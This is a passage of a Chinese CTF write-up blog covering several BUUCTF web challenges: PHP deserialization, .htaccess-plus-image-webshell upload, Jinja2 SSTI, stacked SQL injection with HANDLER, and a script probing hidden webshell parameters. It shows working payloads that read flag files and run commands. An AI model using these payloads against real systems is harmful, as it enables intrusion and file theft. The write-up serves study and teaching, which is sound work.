</span></span></code></pre></td></tr></table></div></div><p>需要payload中的字符ascii码值<code>大于</code>32<code>小于</code>125。注意到最后有一个<code>unserialize</code>函数，判断这道题考点是反序列化。接下来分析源码：</p><ul><li><code>process()</code>函数判断op的值，如果是<code>1</code>就写入文件，如果是<code>2</code>就读取文件。代码开头包含了<code>flag.php</code>文件，所以推测需要使用2操作数读取flag.php文件。</li><li><code>write()</code>把对象中的<code>$content</code>属性值写入到<code>$filename</code>文件中，如果长度大于100会被拦下。</li><li><code>read()</code>使用**file_get_contents()**函数读取文件。<strong>正是我们想要的</strong>。</li><li><code>output()</code>输出内容。</li><li><code>__destruct()</code>对象销毁时会执行的函数，需要注意的是<strong>if</strong>判断里的<code>$this->op === "2"</code>是强比较，并且会修改op的值为1（写文件），因为**&ldquo;2&rdquo;<strong>是一个字符串类型的如果传入</strong>整型的2**即可绕过。</li></ul><p>所以我们构造一个对象<strong>op</strong>为2，<strong>filename</strong>为flag.php即可，读文件的时候肯定不是</p><p>接下来是反序列化时会遇到的问题，因为对象中属性的修饰是<code>protected</code>，序列化时需要保证一致的。</p><p>先给出自己创建的对象源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>FileHandler</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$op</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$filename</span><span class=o>=</span><span class=s2>&#34;/var/www/html/flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span>  <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>FileHandler</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><ol><li>PHP7.1以上版本对属性类型不敏感、用public绕过:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:11:&#34;FileHandler&#34;:3:{s:2:&#34;op&#34;;i:2;s:8:&#34;filename&#34;;s:22:&#34;/var/www/html/flag.php&#34;;s:7:&#34;content&#34;;N;}
</span></span></code></pre></td></tr></table></div></div><p>运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:11:&#34;FileHandler&#34;:3:{s:2:&#34;op&#34;;i:2;s:8:&#34;filename&#34;;s:52:&#34;php://filter/convert.base64-encode/resource=flag.php&#34;;s:7:&#34;content&#34;;N;}
</span></span></code></pre></td></tr></table></div></div><ol start=2><li>序列化字符串中s替换为S，支持字符串用16进制，</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:11:&#34;FileHandler&#34;:3:{S:5:&#34;\00*\00op&#34;;i:2;S:11:&#34;\00*\00filename&#34;;S:22:&#34;/var/www/html/flag.php&#34;;S:10:&#34;\00*\00content&#34;;N;}
</span></span></code></pre></td></tr></table></div></div><p>思路：https://blog.csdn.net/Oavinci/article/details/106998738</p><hr><h1 id=mrctf2020你传你呢 class=headerLink><a href=#mrctf2020%e4%bd%a0%e4%bc%a0%e4%bd%a0%e5%91%a2 class=header-mark></a>[MRCTF2020]你传你🐎呢</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png></p><p>测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的<code>.htaccess</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SetHandler application/x-httpd-php
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png></p><p>传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了<code>Content-Type: image/jpeg</code>可以了，说明Content-Type是GIF还不行，接下来直接传图片码</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png></p><p>根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png></p><p>不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考<a href=https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/ target=_blank rel="noopener noreffer">【极客大挑战 2019】RCE ME</a>。</p><hr><h1 id=bjdctf-2ndfake-google class=headerLink><a href=#bjdctf-2ndfake-google class=header-mark></a>[BJDCTF 2nd]fake google</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png></p><p>就一个输入框，随便输入一个去看看，跳转以后</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png></p><p>注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试<a href=https://blog.csdn.net/qq_40657585/article/details/83657220 target=_blank rel="noopener noreffer">SSTI (服务器模板注入)</a></p><p>找到了一个直接读文件的payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/flag&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png></p><hr><h1 id=gyctf2020blacklist class=headerLink><a href=#gyctf2020blacklist class=header-mark></a>[GYCTF2020]Blacklist</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png></p><p>sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;</span><span class=p>,</span><span class=nv>$inject</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;;show tables;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>FlagHere
</span></span></span><span class=line><span class=cl><span class=s1>words
</span></span></span></code></pre></td></tr></table></div></div><p>查看表结构：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;;desc `FlagHere`;
</span></span></span></code></pre></td></tr></table></div></div><p>接下来是看的wp，学到了个新姿势：使用<code>HANDLER ... OPEN</code>语句，贴一个<a href=https://dev.mysql.com/doc/refman/8.0/en/handler.html target=_blank rel="noopener noreffer">官方文档</a>。</p><p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>-</span><span class=mi>1</span><span class=s1>&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close
</span></span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png></p><hr><h1 id=强网杯-2019高明的黑客 class=headerLink><a href=#%e5%bc%ba%e7%bd%91%e6%9d%af-2019%e9%ab%98%e6%98%8e%e7%9a%84%e9%bb%91%e5%ae%a2 class=header-mark></a>[强网杯 2019]高明的黑客</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png></p><p>下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># codeing = utf-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span>  <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>adapters</span><span class=o>.</span><span class=n>DEFAULT_RETRIES</span> <span class=o>=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>keep_alive</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sem</span><span class=o>=</span><span class=n>threading</span><span class=o>.</span><span class=n>Semaphore</span><span class=p>(</span><span class=mi>30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;D:\DROPS\phpstudy_pro\WWW\ctf\src</span><span class=se>\\</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fileNames</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rrGET</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\$_GET\[\&#39;(\w+)\&#39;\]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rrPOST</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\$_POST\[\&#39;(\w+)\&#39;\]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>local_file</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>fileName</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>sem</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=o>+</span><span class=n>fileName</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+]checking: </span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=n>fileName</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>#GET</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>rrGET</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;</span><span class=si>%s</span><span class=s2>?</span><span class=si>%s</span><span class=s2>=</span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=p>(</span><span class=n>fileName</span><span class=p>,</span><span class=n>i</span><span class=p>,</span><span class=s2>&#34;echo ~guobanghhh~&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;~guobanghhh~&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=n>fileName</span> <span class=o>+</span> <span class=s2>&#34;中的&#34;</span> <span class=o>+</span> <span class=n>i</span> <span class=o>+</span> <span class=s2>&#34;可以用！！！&#34;</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>local_file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>#POST</span>
</span></span><span class=line><span class=cl>        <span class=c1># for i in rrPOST.findall(content):</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     r = session.post(url+fileName,data={i:&#34;echo ~guobanghhh~&#34;})</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     if &#34;~guobanghhh~&#34; in r.text:</span>
</span></span><span class=line><span class=cl>        <span class=c1>#         flag = fileName + &#34;中的&#34; + i + &#34;可以用！！！&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1>#         print(flag)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#         local_file.write(flag)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>(</span><span class=s2>&#34;xk0SzyKwfzw.php&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>  <span class=c1># 开始时间</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[start]程序开始:&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>start_time</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>thread_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>fileName</span> <span class=ow>in</span> <span class=n>fileNames</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>run</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>fileName</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>        <span class=n>thread_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>thread_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>thread_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>结果就是访问</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
</span></span></code></pre></td></tr></table></div></div><p>获得flag</p><hr><h1 id=mrctf2020ez_bypass class=headerLink><a href=#mrctf2020ez_bypass class=header-mark></a>[MRCTF2020]Ez_bypass</h1><p>不截图了，主页没有代码格式，贴一个源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>I</span> <span class=nx>put</span> <span class=nx>something</span> <span class=nx>in</span> <span class=nx>F12</span> <span class=k>for</span> <span class=nx>you</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$flag</span><span class=o>=</span><span class=s1>&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;gg&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$id</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$gg</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;gg&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$gg</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$id</span> <span class=o>!==</span> <span class=nv>$gg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;You got the first step&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;passwd&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$passwd</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;passwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$passwd</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                 <span class=k>if</span><span class=p>(</span><span class=nv>$passwd</span><span class=o>==</span><span class=mi>1234567</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                 <span class=p>{</span>
</span></span><span class=line><span class=cl>                     <span class=k>echo</span> <span class=s1>&#39;Good Job!&#39;</span><span class=p>;</span>
